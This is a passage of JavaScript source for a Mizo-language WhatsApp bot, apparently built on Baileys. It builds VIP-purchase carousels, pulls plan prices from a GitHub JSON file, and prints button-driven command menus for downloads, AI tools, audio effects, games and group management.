"sourceUrl": `https://youtube.com/@HBMods_Channel`}}},
{ quoted: m})
 }
break

case "buyvipxx": {
const balance = await eco.balance(limitneihtu, kancoins)
const vawiinni2 = await mizo_tawnga_translate_na.translate(asource1, atarget1, athulo1)
HBWABotMz.sendMessage(from, { react: { text: "😎" , key: m.key }})
 const ckfrvip1 = "ckfrvip3";
    const limit23 = await eco.balance(limitneihtu, ckfrvip1);
    const englovip = ('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/VIP/info.json')
const englovip1 = await fetch(englovip)
const englovip2 = await englovip1.json()
const englovip3 = englovip2['10days'];
const englovip4 = englovip2['20days'];
const englovip5 = englovip2['1month'];
const englovip6 = englovip2['2month'];
const englovip7 = englovip2['lifetime'];
const englovip8 = englovip2.info;
	//let img = "https://api.tioo.eu.org/file/orUw0hDm227X.png"
	const img = buyvipthumb
	async function image(url) {
		const {
			imageMessage
		} = await generateWAMessageContent({
			image: {
				url
			}
		}, {
			upload: HBWABotMz.waUploadToServer
		})
		return imageMessage
	}
	if (!isVip && limit23.wallet < 10) {
	await dodoi("> VIP FREE Trial La Claim loh i nei\nPrivate Chat-ah VIP Plan i en theih turin ka rawn thawn e")
	let msg = generateWAMessageFromContent(
    m.sender,
    {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: `Hello🥰 ${pushname}, please select your favourite option`
                    },
                    carouselMessage: {
                        cards: [
                            {
                                header: {
                                    imageMessage: await image(img),
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: `*👑 ${botname}*
${englovip8}\n> Gpay : 918416093656`
      },
      nativeFlowMessage: {
     buttons: [
{
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "VIEW PLAN",
                sections: [
                  {
                    title: "I DUH BER SELECT RAWH",
                    rows: [
                     {
                        title: "VIP Vawi10 hman theihna",
                        description: "Free",
                        id: `${prefix}`+`hb2ab95`
                      },
                      {
                        title: "10 days VIP Membership",
                        description: `${englovip3}`,
                        id: `${prefix}`+`myid1`
                      },
                      {
                        title: "20 days VIP Membership",
                        id: `${prefix}`+`myid2`,
                        description: `${englovip4}`,
                      },
                      {
                        title: "1 Month VIP Membership",
                        id: `${prefix}`+`myid3`,
                        description: `${englovip5}`
                      },
                      {
                        title: "2 Month VIP Membership",
                        id: `${prefix}`+`myid4`,
                        description: `${englovip6}`
                      }
                    ]
                  },
                  {
                    title: "Best Offer",
                    highlight_label: "Best",
                    rows: [
                      {
                        title: "1Year VIP Membership",
                        description: `${englovip7}`,
                        id: `${prefix}`+`myid5`
                      }
                    ]
                  }
                ]
              })
            }
                                       
                                    ],
                                    messageVersion: 1
                                }
                            }
                        ]
                    }
                }
            }
        }
    },
    {quoted:m}
);

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
});
   return 
  }
  await dodoi("Private Chat-ah VIP Plan i en theih turin ka rawn thawn e")
  let msg2 = generateWAMessageFromContent(
    m.sender,
    {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: `Hello🥰 ${pushname}, please select your favourite option`
                    },
                    carouselMessage: {
                        cards: [
                            {
                                header: {
                                    imageMessage: await image(img),
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: `*👑 ${botname}*
${englovip8}\n> Gpay : 918416093656`
      },
      nativeFlowMessage: {
     buttons: [
{
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "VIEW PLAN",
                sections: [
                  {
                    title: "I DUH BER SELECT RAWH",
                    rows: [
                      {
                        title: "10 days VIP Membership",
                        description: `${englovip3}`,
                        id: `${prefix}`+`myid1`
                      },
                      {
                        title: "20 days VIP Membership",
                        id: `${prefix}`+`myid2`,
                        description: `${englovip4}`,
                      },
                      {
                        title: "1 Month VIP Membership",
                        id: `${prefix}`+`myid3`,
                        description: `${englovip5}`
                      },
                      {
                        title: "2 Month VIP Membership",
                        id: `${prefix}`+`myid4`,
                        description: `${englovip6}`
                      }
                    ]
                  },
                  {
                    title: "Best Offer",
                    highlight_label: "Best",
                    rows: [
                      {
                        title: "1Year VIP Membership",
                        description: `${englovip7}`,
                        id: `${prefix}`+`myid5`
                      }
                    ]
                  }
                ]
              })
            }
                                    ],
                                    messageVersion: 1
                                }
                            }
                        ]
                    }
                }
            }
        }
    },
    {quoted:m}
);

await HBWABotMz.relayMessage(msg2.key.remoteJid, msg2.message, {
    messageId: msg2.key.id
});
}
break

case 'alive': case 'menu': case 'help':{
const balance = await eco.balance(limitneihtu, kancoins)
const vawiinni2 = await mizo_tawnga_translate_na.translate(asource1, atarget1, athulo1)
HBWABotMz.sendMessage(from, { react: { text: "😎" , key: m.key }})
const lusm = `*✑ Hriattur*: *Coinsi neih loh chuan min hmang thei dawn lo. Min hman i duh chuan claim tih rawn type rawh*`
const enm = `_*Note*_\n*If you don't have any limit, you cannot use my features if you want to use my features please type limit*`
if (isBusiness) {
HBWABotMz.sendMessage(m.chat, { image: fs.readFileSync('./asset/image/HBWABot.png'),  caption:`*Bot InFo*
*✑ Vawiin :* ${vawiinni2}
*✑ Date :* ${kumtin}
*✑ Version :* 15.0.0
*✑ User :* ${ownernumber}
*✑ Coins :* ${balance.wallet} 🪙
*✑ Vip :* ${aActiveEm}
*✑ Runtime :* ${runtime(process.uptime())}
*✑ Creator :* Herbert Suantak
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
╭═══════════┈
┃𒆜┌───┈
┃𒆜│vipmenu
┃𒆜│allmenu
┃𒆜│aimenu
┃𒆜│mizomenu
┃𒆜│downloadmenu
┃𒆜│groupmenu
┃𒆜│ownermenu
┃𒆜│voicemenu
┃𒆜│convertmenu
┃𒆜│gamemenu
┃𒆜│stickermenu
┃𒆜│stalkermenu
┃𒆜│audiochanger
┃𒆜│othermenu
┃𒆜└───────────┈ 
╰════════════──┈ `}, { quoted: m });
return
}

const buttons = [
    {
        buttonId: `${prefix}owner`, 
        buttonText: { displayText: 'Owner' }
    },
    {
        buttonId: `${prefix}/donate`,
        buttonText: { displayText: "Donate" }
    }
];

const buttonMessage = {
    image: fs.readFileSync('./asset/image/HBWABot.png'),
    caption: `*${botname} INFO*
*✑ Vawiin :* ${vawiinni2}
*✑ Date :* ${kumtin}
*✑ Version :* 15.0.0
*✑ User :* ${ownernumber}
*✑ Coin :* ${balance.wallet} 🪙
*✑ Vip :* ${aActiveEm}
*✑ Runtime :* ${runtime(process.uptime())}
*✑ Creator :* Herbert Suantak
${lusm}`,
    footer: "© HBWABot Mz",
    buttons: buttons,
    headerType: 4,
    contextInfo: {
     mentionedJid: [m.sender], 
     forwardingScore: 1,
     isForwarded: true,
     forwardedNewsletterMessageInfo: {
     newsletterJid: '120363191549232941@newsletter',
     newsletterName: ownername,
     serverMessageId: 400
   }
              }
};

const flowActions = [
    {
        buttonId: `owner`,
        buttonText: {
            displayText: 'Owner'
        },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
   title: "VIEW MENU",
   sections: [{
       title: `${botname}`,
       highlight_label: "HBMods OFC",
       rows: [
         {
           title: "LIMIT",
           description: `Bot features te hman ka duh`,
           id: `${prefix}`+`limit`
         }
       ]
     },
     {
       title: "I DUH BER SELECT RAWH",
       highlight_label: "HBMods OFC",
       rows: [
           {
               title: "All Menu",
               description: `Menu ho a vaiin ka en duh`,
               id: `${prefix}allmenu`
           },
           {
               title: "Ai Menu",
               description: `Artificial intelligence menu ka en duh`,
               id: `${prefix}aimenu`
           },
           {
               title: "Mizo Menu",
               description: "Mizo menu ka en duh",
               id: `${prefix}mizomenu`
           },
           {
               title: "Download Menu",
               description: `Thil download theihna menu ka en duh`,
               id: `${prefix}downloadmenu`
           },
           {
               title: "Group Menu",
               description: `Group a hman tur menu ka en duh`,
               id: `${prefix}groupmenu`
           },
           {
               title: "Game Menu",
               description: `Game menu ka en duh`,
               id: `${prefix}gamemenu`
           },
           {
               title: "Convert Menu",
               description: `Convert menu ka en duh`,
               id: `${prefix}convertmenu`
           },
           {
               title: "Sticker Menu",
               id: `${prefix}stickermenu`,
               description: `Sticker siam theihna menu ka en duh`
           },
           {
               title: "Stalker Menu",
               id: `${prefix}stalkermenu`,
               description: `Mi va stalk theihna menu ka en duh`
           },
           {
               title: "Owner Menu",
               id: `${prefix}ownermenu`,
               description: `Owner menu ka en duh`
           },
           {
               title: "Voice Menu",
               id: `${prefix}voicemenu`,
               description: `Text to Sound menu ka en duh`
           },
           {
               title: "Audio Changer",
               id: `${prefix}audiochanger`,
               description: `Audio change theihna menu ka en duh`
           },
           {
               title: "Other Menu",
               id: `${prefix}othermenu`,
               description: `Menu title nei ve lo te chu ka en duh`
           }
       ]
   }]
            })
        }
    },
    {
        nativeFlowInfo: {
            name: "cta_url",
            paramsJson: JSON.stringify({
                display_text: `${buttonig}`,
                url: `${buttonigurl}`,
                merchant_url: "https://www.google.com"
            })
        }
    }
];

buttonMessage.buttons.push(...flowActions);

HBWABotMz.sendMessage(m.chat, buttonMessage, { quoted: m });

}
break
case 'allmenu': {
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "😎" , key: m.key }})
const head =  `╭══════════════
┃ *${global.botname} Allmenu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════`
const pianbody = `͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ AI Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}removebg
┃𒆜│${prefix}ghibli 
┃𒆜│${prefix}remini
┃𒆜│${prefix}toanime
┃𒆜│${prefix}tozombie
┃𒆜│${prefix}shazam
┃𒆜│${prefix}shazam2
┃𒆜│${prefix}shazam3
┃𒆜│${prefix}openai [Mizo Language]
┃𒆜│${prefix}gpt [English Language]
┃𒆜│${prefix}ai [Mizo Language]
┃𒆜│${prefix}ai2 [English Language]
┃𒆜│${prefix}gai [Mizo Language]
┃𒆜│${prefix}deepseek
┃𒆜│${prefix}deepai
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Owner Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}setdpbot
┃𒆜│${prefix}setdpbot2
┃𒆜│${prefix}addvn
┃𒆜│${prefix}statusaudio
┃𒆜│${prefix}statusvideo
┃𒆜│${prefix}statusimage
┃𒆜│${prefix}statustext
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Mizo Tawng ❏*
┃𒆜┌───┈
┃𒆜│${prefix}mizoquiz
┃𒆜│${prefix}picquiz
┃𒆜│${prefix}mbq
┃𒆜│${prefix}biblequiz
┃𒆜│${prefix}lyrics
┃𒆜│${prefix}khb
┃𒆜│${prefix}mzly
┃𒆜│${prefix}cfhb
┃𒆜│${prefix}cfhb2
┃𒆜│${prefix}bible-quotes
┃𒆜│${prefix}bq
┃𒆜│${prefix}mlstalk
┃𒆜│${prefix}igstalk
┃𒆜│${prefix}truth
┃𒆜│${prefix}dare
┃𒆜│${prefix}checkme
┃𒆜│${prefix}check
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Download Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}play 
┃𒆜│${prefix}ytmp3 
┃𒆜│${prefix}ytaudio
┃𒆜│${prefix}ytmp4 
┃𒆜│${prefix}dsong
┃𒆜│${prefix}dvideo
┃𒆜│${prefix}dsong2
┃𒆜│${prefix}song2 
┃𒆜│${prefix}igvid [insta]
┃𒆜│${prefix}igpic [insta]
┃𒆜│${prefix}igstory [insta]
┃𒆜│${prefix}igtv [insta]
┃𒆜│${prefix}ttvid [tiktok]
┃𒆜│${prefix}ptvid [pinterest]
┃𒆜│${prefix}twvid [twitter]
┃𒆜│${prefix}trvid [threads]
┃𒆜│${prefix}fbvid [facebook]
┃𒆜│${prefix}gdrive 
┃𒆜│${prefix}ringtone 
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Audio Changer❏*
┃𒆜┌───┈
┃𒆜│${prefix}robot
┃𒆜│${prefix}bass
┃𒆜│${prefix}nightcore
┃𒆜│${prefix}deep
┃𒆜│${prefix}fast
┃𒆜│${prefix}slow
┃𒆜│${prefix}reverse
┃𒆜│${prefix}blown
┃𒆜│${prefix}smooth
┃𒆜│${prefix}squirrel
┃𒆜│${prefix}errape
┃𒆜│${prefix}fat
┃𒆜│${prefix}tokaraoke
┃𒆜│${prefix}voiceremove
┃𒆜│${prefix}tovocal
┃𒆜│${prefix}noiseremove
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Group Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}group open
┃𒆜│${prefix}group clos
┃𒆜│${prefix}grouplink 
┃𒆜│${prefix}add 
┃𒆜│${prefix}kick 
┃𒆜│${prefix}hidetag 
┃𒆜│${prefix}check
┃𒆜│${prefix}setgrdp
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Game Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}buycoin
┃𒆜│${prefix}spin1
┃𒆜│${prefix}checkme
┃𒆜│${prefix}spin
┃𒆜│${prefix}transfer
┃𒆜│${prefix}daily
┃𒆜│${prefix}gamble
┃𒆜│${prefix}withdraw
┃𒆜│${prefix}deposite
┃𒆜│${prefix}magicpick
┃𒆜│${prefix}truth
┃𒆜│${prefix}dare
┃𒆜│${prefix}checkme
┃𒆜│${prefix}check
┃𒆜│${prefix}colour
┃𒆜│${prefix}guess
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Voice Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}tovn
┃𒆜│${prefix}tts
┃𒆜│${prefix}tts2
┃𒆜│${prefix}tts3
┃𒆜│${prefix}tts4
┃𒆜│${prefix}tts5
┃𒆜│${prefix}tts6
┃𒆜│${prefix}tts7
┃𒆜│${prefix}tts8
┃𒆜│${prefix}tts9
┃𒆜│${prefix}tts10
┃𒆜│${prefix}alto
┃𒆜│${prefix}tenor
┃𒆜│${prefix}sunshine
┃𒆜│${prefix}warmy
┃𒆜│${prefix}glorious
┃𒆜│${prefix}itgoesup
┃𒆜│${prefix}chipmunk
┃𒆜│${prefix}dramatic
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Convert Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}wadl
┃𒆜│${prefix}vodl
┃𒆜│${prefix}toqr 
┃𒆜│${prefix}tinyurl
┃𒆜│${prefix}topdf
┃𒆜│${prefix}pictopdf 
┃𒆜│${prefix}tovn 
┃𒆜│${prefix}toaudio 
┃𒆜│${prefix}tomp3 
┃𒆜│${prefix}toimg
┃𒆜│${prefix}sticker 
┃𒆜│${prefix}ebinary 
┃𒆜│${prefix}dbinary
┃𒆜│${prefix}ping
┃𒆜│${prefix}translate
┃𒆜│${prefix}runtime
┃𒆜│${prefix}swm
┃𒆜│${prefix}sc
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Other Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}leaderboard
┃𒆜│${prefix}lb
┃𒆜│${prefix}richest 
┃𒆜│${prefix}list tobebot
┃𒆜│${prefix}how tobebot
┃𒆜│${prefix}mawl ber
┃𒆜│${prefix}sual ber
┃𒆜│${prefix}fing ber
┃𒆜│${prefix}a ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}hmelchhe ber
┃𒆜│${prefix}damrei ber
┃𒆜│${prefix}dawih ber
┃𒆜│${prefix}hrisel ber
┃𒆜│${prefix}upa ber
┃𒆜│${prefix}naupang ber
┃𒆜│${prefix}hmeltha ber
┃𒆜│${prefix}lulian ber
┃𒆜│${prefix}zaktheilo ber
┃𒆜│${prefix}zakzum ber
┃𒆜│${prefix}nawi ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}mifel ber
┃𒆜│${prefix}chawheh ber
┃𒆜│${prefix}bumhmang ber
┃𒆜│${prefix}lerh ber
┃𒆜│${prefix}luck ber
┃𒆜│${prefix}zei ber
┃𒆜└───────────┈ 
╰══════════════𖡛`
if (isBusiness) {
HBWABotMz.sendMessage(m.chat, { image: fs.readFileSync('./asset/image/HBWABot.png'), caption: head +`\n${pianbody}` }, { quoted: m });
return
}
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: head
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: pianbody
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./asset/image/HBWABot.png')}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `${buttonyt}`,
                url: `${buttonyturl}`,
                merchant_url: "https://www.google.com"
            })
        },
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `${buttonig}`,
                url: `${buttonigurl}`,
                merchant_url: "https://www.google.com"
            })
        },
        {
         "name": "quick_reply",
         "buttonParamsJson": `{"display_text":"Buy Me Coffee","id":"/donate"}`
          }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
/*
case 'alive': case 'menu': case 'help':{ 
HBWABotMz.sendMessage(from, { react: { text: "😎" , key: m.key }})
const balance = await eco.balance(limitneihtu, kancoins)
const vawiinni2 = await mizo_tawnga_translate_na.translate(asource1, atarget1, athulo1)
var menuthla = await fs.readFileSync('./asset/image/HBWABot.png')
const lusm = `*_Hriattur_*:\n*Limit i neih loh chuan min hmang thei dawn lo. Min hman i duh chuan limit tih rawn type rawh*`
const enm = `_*Note*_\n*If you don't have any limit, you cannot use my features if you want to use my features please type limit*`
    var bawng5 = 'en';
    var bawng6 = `${bot_language}`;
    var bawng7 = `${enm}`
    var bawng8 = await mizo_tawnga_translate_na.translate(bawng5, bawng6, bawng7);
   const caption1 = `*Bot InFo*
*✑ Vawiin :* ${vawiinni2}
*✑ Date :* ${kumtin}
*✑ Version :* 12.0.0
*✑ User :* ${ownernumber}
*✑ coins :* ${balance.wallet} 🪙
*✑ Vip :* ${aActiveEm}
*✑ Runtime :* ${runtime(process.uptime())}
*✑ Creator :* Herbert Suantak
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏